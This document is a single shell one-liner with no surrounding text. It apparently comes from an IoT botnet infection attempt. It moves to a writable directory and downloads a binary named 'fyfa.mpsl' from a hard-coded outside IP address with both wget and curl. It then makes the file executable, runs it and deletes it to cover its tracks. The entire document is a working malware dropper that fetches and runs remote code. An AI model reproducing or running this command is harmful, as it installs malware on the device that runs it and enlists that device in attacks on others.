cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.63.114/fyfa.mpsl; curl -O http://173.0.63.114/fyfa.mpsl; chmod +x fyfa.mpsl; ./fyfa.mpsl; rm -rf fyfa.mpsl
